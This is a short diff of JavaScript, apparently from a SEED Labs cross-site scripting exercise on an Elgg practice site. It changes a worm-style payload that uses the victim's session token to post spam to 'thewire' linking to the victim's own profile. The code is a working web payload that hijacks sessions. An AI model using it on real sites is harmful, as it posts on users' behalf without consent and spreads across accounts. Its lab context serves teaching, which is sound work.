@@ -16,7 +16,7 @@
 
     sendurl="http://www.seed-server.com/action/thewire/add"; //FILL IN
 
-    var stringToPost = `To earn 12 USD/Hour(!), visit now\nhttp://www.seed-server.com/profile/samy`;
+    var stringToPost = "To earn 12 USD/Hour(!), visit now\nhttp://www.seed-server.com/profile/" + elgg.session.user.username;
 
 	var content = new FormData();
 	content.append('__elgg_token', elgg.security.token.__elgg_token);
